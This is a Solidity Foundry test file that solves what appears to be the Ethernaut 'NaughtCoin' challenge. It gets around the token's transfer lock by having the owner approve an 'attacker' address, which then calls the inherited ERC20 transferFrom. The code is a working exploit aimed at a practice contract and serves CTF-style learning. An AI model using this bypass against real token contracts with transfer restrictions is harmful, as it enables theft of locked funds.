// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import {Test} from "../lib/forge-std/src/Test.sol";

contract NaughtCoinAttackTest is Test {
    NaughtCoin public naughtCoinTest;
    address public attacker = address(0xBEEF);
    address public ownerAddress = address(0xBEEF1);

    function setUp() public {
        naughtCoinTest = new NaughtCoin(ownerAddress);
    }

    function testTransfer() public {
        /*
         * As the contract inherits ERC20 token contract, it inherits all the functions and the state variables from it.
         * So instead of using 'transfer' function defined in the contract, we use 'transferFrom'.
         * 'transferFrom' - is inherited from ERC20 token contract.
         */
        vm.startPrank(ownerAddress);

        uint256 balance = naughtCoinTest.balanceOf(ownerAddress);
        naughtCoinTest.approve(attacker, balance);

        vm.stopPrank();

        vm.startPrank(attacker);

        naughtCoinTest.transferFrom(ownerAddress, attacker, balance);
        assertEq(naughtCoinTest.balanceOf(attacker), balance);
        assertEq(naughtCoinTest.balanceOf(ownerAddress), 0);

        vm.stopPrank();
    }
}